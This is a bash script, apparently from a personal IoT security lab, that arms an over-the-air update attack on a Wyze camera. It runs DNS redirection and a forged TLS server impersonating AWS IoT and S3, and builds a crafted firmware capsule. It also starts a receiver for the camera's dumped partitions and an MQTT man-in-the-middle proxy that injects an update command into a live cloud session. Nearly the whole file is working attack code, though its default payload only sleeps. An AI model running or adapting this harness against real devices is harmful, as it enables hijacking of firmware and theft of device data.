#!/bin/bash
# Arm the LAN OTA harness for one camera and keep it armed.
#
#   forged TLS :443  (eMudhra leaf, SANs cover aws-iot / *.iot.us-west-2 / S3 / upgrade-service)
#   capsule    :<CAP_DIR>/<CAP_PATH>, built here if absent
#   MQTT proxy :8883 (transparent to the real AWS with the device's own certs; injects the
#                     shadow delta and cmd 1234 into a live session)
#
# DNS + ARP are bettercap's job (com.jeffreyemanuel.wyze-spoof). This script only owns the two
# listeners, so it is safe to run under launchd KeepAlive: every start clears stale copies first.
#
#   CAM=192.168.4.23 MAC=80482c525905 ./wyze_ota_arm.sh
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
PY=/opt/homebrew/bin/python3

CAM="${CAM:-192.168.4.23}"
MAC="${MAC:-80482c525905}"
UP="${UP:-192.168.4.160}"
CAP_DIR="${CAP_DIR:-/tmp/fwserve}"
CAP_PATH="${CAP_PATH:-wuv2/upgrade/HL_CAM4/firmware/4.52.17.33.tar}"
PROBE="${PROBE:-/tmp/probe.sh}"

# 1. capsule (zero-write dispatch probe: platform_upgrade never checks the exit status, so a
#    2-minute extra uptime proves the script ran)
if [ ! -s "$CAP_DIR/$CAP_PATH" ]; then
  mkdir -p "$(dirname "$CAP_DIR/$CAP_PATH")"
  [ -s "$PROBE" ] || printf '#!/bin/sh\nsleep 120\n' > "$PROBE"
  "$PY" "$HERE/build_ota_tar.py" --script "$PROBE" --out-dir /tmp/cap_probe --no-aes >/dev/null
  cp /tmp/cap_probe/Upgrade.tar "$CAP_DIR/$CAP_PATH"
fi
# the device's own IoT material, served from the same forged host so the cloud API can hand out
# URLs that resolve here (get_iot_certificate -> /fss/{rootCA.crt,cert.pem,privkey.pem})
CERTDIR="/Users/jemanuel/.config/fss-lab/wyze_iot/$(echo "$MAC" | tr a-f A-F)"
if [ ! -s "$CERTDIR/cert.pem" ]; then
  # the proxy presents this cert upstream; without it every session dies with FileNotFoundError
  # and the device just loops on registration, which looks like a device fault.
  echo "FATAL: no device cert at $CERTDIR (restore from /tmp/fwserve/fss or the cloud)" >&2
fi
mkdir -p "$CAP_DIR/fss"
for f in rootCA.crt cert.pem privkey.pem; do
  src="/Users/jemanuel/.config/fss-lab/wyze_iot/$(echo "$MAC" | tr a-f A-F)/$f"
  [ -s "$src" ] && cp "$src" "$CAP_DIR/fss/$f"
done
MD5=$(md5 -q "$CAP_DIR/$CAP_PATH")
URL="https://s3-us-west-2.amazonaws.com/$CAP_PATH"

# 2. stale listeners shadow new runs silently (EADDRINUSE)
for port in 443 8883; do
  pids=$(lsof -nP -tiTCP:"$port" -sTCP:LISTEN 2>/dev/null)
  [ -n "$pids" ] && kill $pids 2>/dev/null
  # a launchd respawn can race the previous run's listener; wait for the port, bounded
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    lsof -nP -tiTCP:"$port" -sTCP:LISTEN >/dev/null 2>&1 || break
    sleep 0.3
  done
done

# 3. forged TLS. The forge rewrites certs/emudhra/serve.pem on start, so hand the proxy its own
#    copy built here — loading the file the forge is truncating gives "PEM lib".
mkdir -p /tmp/ota
# newline-separated: a PEM without a trailing newline glues the next header on and OpenSSL
# answers "PEM: BAD_END_LINE"
{ cat "$HERE/../certs/emudhra/leaf.pem"; echo; cat "$HERE/../certs/emudhra/ev-ca-aaa-cross.pem"; \
  echo; cat "$HERE/../certs/emudhra/leaf.key"; } > /tmp/ota/chain.pem
"$PY" "$HERE/wyze_dns_redirect.py" "$UP" "${GW:-192.168.4.1}" >>/tmp/dns.log 2>&1 &
"$PY" "$HERE/wyze_forge_serve.py" --dir "$CAP_DIR" --port 443 \
  --sni s3-us-west-2.amazonaws.com >>/tmp/ota/forge.log 2>&1 &
# the capsule streams every partition back before it writes; without a receiver it dies at step 2
"$PY" "$HERE/wyze_backup_recv.py" --base-port "${PORT:-8446}" --dir /tmp/fwbackup \
  >>/tmp/ota/backup.log 2>&1 &
FORGE=$!
sleep 1

echo "armed: $URL md5=$MD5 cam=$CAM mac=$MAC" >>/tmp/ota/arm.log

# 4. proxy in the foreground so launchd supervises it; the forge is reaped by the trap
trap 'kill $FORGE 2>/dev/null' EXIT
export THING="$MAC" D="/Users/jemanuel/.config/fss-lab/wyze_iot/$(echo "$MAC" | tr a-f A-F)"
export CHAIN=/tmp/ota/chain.pem INJECT=1 OTA_URL="$URL" OTA_MD5="$MD5"
exec "$PY" "$HERE/wyze_mqtt_mitm.py"
